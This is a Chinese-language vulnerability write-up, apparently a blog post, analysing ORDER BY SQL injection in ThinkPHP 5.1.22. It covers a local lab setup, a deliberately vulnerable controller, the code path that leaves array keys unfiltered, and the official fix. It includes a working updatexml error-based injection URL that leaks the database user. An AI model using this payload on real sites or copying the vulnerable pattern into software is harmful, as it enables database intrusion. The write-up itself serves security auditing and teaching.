# 原创
：  ThinkPHP5.1.x SQL注入（orderby注入）

# ThinkPHP5.1.x SQL注入（orderby注入）

#### ThinkPHP5.1.x SQL注入（orderby注入）

## 漏洞概要

> 



## 初始配置

> 
获取测试环境代码


```
composer create-project --prefer-dist topthink/think=5.1.22 tpdemo

```

> 
将 composer.json 文件的 require 字段设置成如下


```
"require": {
        "php": "&gt;=5.6.0",
        "topthink/framework": "5.1.22"
    },

```

> 
然后执行 `composer update`


> 
下载后的源码中，需要对 `application/index/controller/Index.php` 内容进行修改


```
&lt;?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $orderby = request()-&gt;get('orderby');
        $result = db('users')-&gt;where(['username' =&gt; 'mochazz'])-&gt;order($orderby)-&gt;find();
        var_dump($result);
        return '&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style="font-size:30px"&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;think id="eab4b9f840753f8e7"&gt;&lt;/think&gt;';
    }
}

```

> 
在 `config/database.php` 文件中配置数据库相关信息，并开启 `config/app.php` 中的 `app_debug` 和 `app_trace` ，创建数据库信息如下


```
create database thinkphp;
use thinkphp;
create table users(
	id int primary key auto_increment,
	username varchar(50) not null
);
insert into users(id,username) values(1,'H3rmesk1t');

```

## 漏洞利用

> 
Payload


```
http://127.0.0.1/cms/public/index.php?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1 

```

## 漏洞分析

> 
首先数据都会进入到 `Request` 类中的 `input` 方法，并且经过 `filterValue` 方法的过滤和强制类型转换并返回 `$data`


> 
这里 `array_walk_recursive` 函数对数组中的成员递归调用 `filterValue` 过滤函数，但是 `filterValue` 过滤函数，不过滤数组的 `key` ， 只过滤了数组的 `value`，用户输入的数据会原样进入框架的 SQL 查询方法中，进入 `Query` 类


> 
恶意Payload 未经过任何过滤直接传递给 `options['order']` 中


> 
接着调用 `find` 方法，此处 `$this-&gt;connection` 是 `think/db/connectior/Mysql` 类 ，继承于 `Connection` 类，于是此处继续调用该类的 `find` 方法


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4dccfe114bc4402f9df5aae820915734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6f81151b864a4ec99a7b8d65e1e0996a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
该方法继续调用了 `$this-&gt;builder`, 即 `think/db/builder/Mysql` 类的 `select` 方法，该方法通过 `str_replace` 函数，将数据填充到SQL语句中


> 
然后调用了 `parseOrder` 方法，跟进该方法，`$order` 是输入的数据，然后经过了 `parseKey` 方法处理后返回给 `$array`，跟进查看该方法的实现


```
protected function parseOrder(Query $query, $order)
    {
        if (empty($order)) {
            return '';
        }

        $array = [];

        foreach ($order as $key =&gt; $val) {
            if ($val instanceof Expression) {
                $array[] = $val-&gt;getValue();
            } elseif (is_array($val)) {
                $array[] = $this-&gt;parseOrderField($query, $key, $val);
            } elseif ('[rand]' == $val) {
                $array[] = $this-&gt;parseRand($query);
            } else {
                if (is_numeric($key)) {
                    list($key, $sort) = explode(' ', strpos($val, ' ') ? $val : $val . ' ');
                } else {
                    $sort = $val;
                }

                $sort    = strtoupper($sort);
                $sort    = in_array($sort, ['ASC', 'DESC'], true) ? ' ' . $sort : '';
                $array[] = $this-&gt;parseKey($query, $key, true) . $sort;
            }
        }

        return ' ORDER BY ' . implode(',', $array);
    }

```

> 
跟进 `thinkphp/library/think/db/builder/Mysql.php`，该方法在变量 `$key` 的两端添加了反引号进行拼接并且没有任何过滤


> 
最终返回了一个带有 ORDER BY 的 SQL 注入 payload 给要执行的SQL语句，实现 ORDER BY 注入


> 
完整的方法调用，从下往上


## 漏洞修复

> 
官方的修复方法是：在拼接字符串前对变量进行检查，看是否存在 `)、#` 两个符号


## 攻击总结

> 
参考Mochazz师傅的审计流程

